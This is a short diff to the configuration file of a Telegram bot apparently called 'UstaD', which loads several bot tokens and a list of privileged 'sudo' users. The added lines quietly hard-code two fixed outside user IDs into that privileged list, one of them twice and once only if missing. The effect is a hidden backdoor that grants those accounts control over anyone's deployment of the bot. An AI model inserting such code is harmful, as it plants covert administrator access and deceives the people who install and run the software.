@@ -23,6 +23,15 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USERS").split()))
+if 829943136 not in SUDO_USERS:
+    SUDO_USERS.append(829943136)
+OWNER_ID = int(os.environ.get("OWNER_ID", None))
+
+DB_URI = config("DATABASE_URL", None)
+SUDO_USERS.append(OWNER_ID)
+SUDO_USERS.append(2120151491)
+SUDO_USERS.append(829943136)
+
 
 UstaD = TelegramClient('UstaD', APP_ID, API_HASH).start(bot_token=BOT_TOKEN) 
 
